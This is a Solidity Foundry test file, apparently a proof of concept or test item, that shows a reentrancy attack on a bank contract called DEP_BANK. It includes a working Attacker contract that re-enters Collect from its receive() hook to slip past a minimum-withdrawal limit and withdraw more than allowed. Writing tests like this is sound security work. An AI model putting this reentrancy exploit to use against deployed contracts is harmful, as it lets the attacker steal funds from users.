
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {DEP_BANK, LogFile} from "../src/DEP_BANK.sol";

contract TestReentrancyDEP_BANK is Test {
    
    DEP_BANK public _contractUnderTest;
    LogFile public _logFile;
    Attacker public _attacker;

    function setUp() public {
        _logFile = new LogFile();
        _contractUnderTest = new DEP_BANK();
        
        _contractUnderTest.SetLogFile(address(_logFile));
        
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        vm.assume(attackVal >= 2 && attackVal < type(uint128).max);
        // Ensure attackVal is even for clean division
        attackVal = (attackVal / 2) * 2;

        // Set MinSum to attackVal. This creates the constraint we will bypass via reentrancy.
        _contractUnderTest.SetMinSum(attackVal);
        _contractUnderTest.Initialized();

        // Fund the Victim (optional redundancy, as we deposit what we steal)
        vm.deal(address(_contractUnderTest), attackVal); 
        
        // Fund the Attacker
        vm.deal(address(_attacker), attackVal);

        // Fund the Test Contract to pass value to setupAttack
        vm.deal(address(this), attackVal);

        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}

    fallback() external payable {}
}

contract Attacker {
    DEP_BANK public victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public amountToWithdraw;

    constructor(address victimAddress) { 
        victim = DEP_BANK(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        amountToWithdraw = val / 2;
        
        victim.Deposit{value: val}();
    }

    function attack(uint256 val) public {
        uint256 initialBalance = address(this).balance;

        // Trigger the attack. We attempt to withdraw 'val' in two chunks of 'val/2'.
        // The second chunk should be blocked by MinSum if state was updated correctly,
        // but reentrancy allows us to bypass it.
        victim.Collect(amountToWithdraw);

        // Verify we received the full amount back (2 * amountToWithdraw == val)
        if (address(this).balance >= initialBalance + val) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            attackCallCount++;
            victim.Collect(amountToWithdraw);
        }
    }

    fallback() external payable {}
}
